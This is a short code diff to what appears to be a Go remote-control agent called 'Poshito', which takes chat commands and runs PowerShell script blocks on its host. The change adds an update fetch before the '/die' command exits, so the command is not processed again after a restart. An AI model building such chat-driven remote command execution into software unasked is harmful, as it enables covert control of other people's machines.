@@ -49,6 +49,8 @@ func parseCommand(chatID int64, text string) {
 		executePowershell(chatID, scriptBlock, "")
 	case "/die":
 		SendMessage(chatID, "Poshito exits.")
+		// We do that to avoid getting the die command again when we're back alive
+		GetUpdates(offset)
 		os.Exit(0)
 	default:
 		SendMessage(chatID, noSuchCommand)
